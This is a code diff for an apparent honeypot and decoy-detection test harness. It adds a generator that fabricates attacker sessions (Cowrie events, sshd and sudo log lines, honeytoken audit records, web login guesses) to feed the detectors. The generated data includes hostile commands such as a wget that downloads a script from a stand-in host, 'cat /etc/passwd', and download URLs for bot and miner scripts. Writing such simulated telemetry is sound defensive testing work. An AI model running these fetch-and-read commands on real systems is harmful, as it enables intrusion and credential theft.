@@ -152,7 +152,7 @@ BENIGN = {
 
 
 
-def build_benign_corpus(scale=40):
+def build_benign_corpus(scale=150):
     """Realistic ordinary host activity, none of which touches a decoy.
 
     Varied deliberately: real usernames, real admin commands, lookalike account
@@ -199,6 +199,77 @@ def build_benign_corpus(scale=40):
                        ["cat", "vim", "less", "grep", "tail"][i % 5],
                        ["cat", "vim", "less", "grep", "tail"][i % 5], kv))
         soft.append(("GET_PATH", paths[i % len(paths)], None))
+    return {"network": net, "system": sysl, "data": data, "software": soft}
+
+
+
+
+def build_attack_corpus(scale=12):
+    """Scale the attack corpus across many simulated sessions.
+
+    The hand-written observations in ATTACK stay first so the original
+    stage/technique coverage is retained; the generated entries vary source
+    address, session, account, command and payload so the result is not a
+    single scripted scenario replayed verbatim.
+    """
+    ips = ["198.51.100.%d" % (20 + i) for i in range(scale)]
+    users = ["root", "admin", "oracle", "ubuntu", "test", "git",
+             "postgres", "jenkins", "backup-admin", "ftpuser"]
+    cmds = ["whoami; id", "cat /etc/passwd", "uname -a; lsb_release -a",
+            "ls -la /opt/backup", "netstat -antp", "cat /proc/cpuinfo",
+            "wget http://198.51.100.9/x.sh -O /tmp/x", "ps aux | grep ssh"]
+    urls = ["http://198.51.100.9/%s.sh" % n for n in
+            ("x", "bot", "miner", "drop", "kit")]
+    web_users = ["admin", "administrator", "root", "operator", "support"]
+
+    net, sysl, data, soft = (list(ATTACK["network"]), list(ATTACK["system"]),
+                             list(ATTACK["data"]), list(ATTACK["software"]))
+
+    for i in range(scale):
+        ip, sid = ips[i], "s%02d" % i
+        u = users[i % len(users)]
+        net.append({"eventid": "cowrie.session.connect", "src_ip": ip,
+                    "src_port": 40000 + i, "dst_port": 2222, "session": sid})
+        net.append({"eventid": "cowrie.login.failed", "src_ip": ip,
+                    "username": u, "password": "%s%d" % (u, i), "session": sid})
+        net.append({"eventid": "cowrie.login.success", "src_ip": ip,
+                    "username": "backup-admin", "password": "backup123",
+                    "session": sid})
+        net.append({"eventid": "cowrie.command.input", "src_ip": ip,
+                    "input": cmds[i % len(cmds)], "session": sid})
+        if i % 2 == 0:
+            net.append({"eventid": "cowrie.session.file_download", "src_ip": ip,
+                        "url": urls[i % len(urls)], "session": sid})
+        else:
+            net.append({"eventid": "cowrie.session.file_upload", "src_ip": ip,
+                        "filename": "/tmp/%s.bin" % sid, "session": sid})
+
+        sysl.append("Nov  9 10:%02d:%02d host sshd[%d]: Failed password for "
+                    "backup-admin from %s port %d ssh2"
+                    % (i % 60, (i * 7) % 60, 3000 + i, ip, 41000 + i))
+        sysl.append("Nov  9 10:%02d:%02d host sshd[%d]: Accepted password for "
+                    "backup-admin from %s port %d ssh2"
+                    % (i % 60, (i * 11) % 60, 3100 + i, ip, 41100 + i))
+        sysl.append("Nov  9 10:%02d:%02d host sshd[%d]: pam_unix(sshd:session): "
+                    "session opened for user backup-admin by (uid=0)"
+                    % (i % 60, (i * 13) % 60, 3200 + i))
+        sysl.append("Nov  9 10:%02d:%02d host sudo: backup-admin : TTY=pts/%d ; "
+                    "PWD=/home/backup-admin ; USER=root ; COMMAND=%s"
+                    % (i % 60, (i * 17) % 60, i % 8, cmds[i % len(cmds)]))
+        sysl.append("Nov  9 10:%02d:%02d host su: pam_unix(su:session): session "
+                    "opened for user backup-admin by (uid=1001)"
+                    % (i % 60, (i * 19) % 60))
+
+        data.append('type=SYSCALL msg=audit(17628%05d.%03d:%d): arch=c000003e '
+                    'syscall=257 success=yes exit=3 auid=1001 uid=1001 gid=1001 '
+                    'euid=1001 comm="%s" exe="/usr/bin/%s" key="mirage_token"'
+                    % (i, i % 1000, 500 + i,
+                       ["cat", "less", "cp", "grep", "head"][i % 5],
+                       ["cat", "less", "cp", "grep", "head"][i % 5]))
+
+        soft.append(("GET", None, None))
+        soft.append(("POST", web_users[i % len(web_users)], "Passw0rd%d!" % i))
+
     return {"network": net, "system": sysl, "data": data, "software": soft}
 
 
@@ -344,7 +415,8 @@ def run_once(tmp, rules, verbose=False):
         })
 
     # ---- network ----------------------------------------------------------
-    for raw in ATTACK["network"]:
+    ATK = build_attack_corpus()
+    for raw in ATK["network"]:
         t0 = time.perf_counter()
         kw = cowrie_adapter.map_cowrie_event(raw)
         if not kw:
@@ -353,7 +425,7 @@ def run_once(tmp, rules, verbose=False):
         chain("network", ev, time.perf_counter() - t0)
 
     # ---- system -----------------------------------------------------------
-    for line in ATTACK["system"]:
+    for line in ATK["system"]:
         t0 = time.perf_counter()
         kw = account_watch.parse_auth_line(line, DECOY_ACCOUNT)
         if not kw:
@@ -362,7 +434,7 @@ def run_once(tmp, rules, verbose=False):
         chain("system", ev, time.perf_counter() - t0)
 
     # ---- data -------------------------------------------------------------
-    for line in ATTACK["data"]:
+    for line in ATK["data"]:
         t0 = time.perf_counter()
         kw = honeytoken_watch.parse_audit_line(line, AUDIT_KEY)
         if not kw:
@@ -382,7 +454,7 @@ def run_once(tmp, rules, verbose=False):
 
     flask_app = software_app.create_app(emitter=_Capture(), admin_path="/admin")
     client = flask_app.test_client()
-    for method, user, pwd in ATTACK["software"]:
+    for method, user, pwd in ATK["software"]:
         t0 = time.perf_counter()
         before = len(captured)
         if method == "GET":
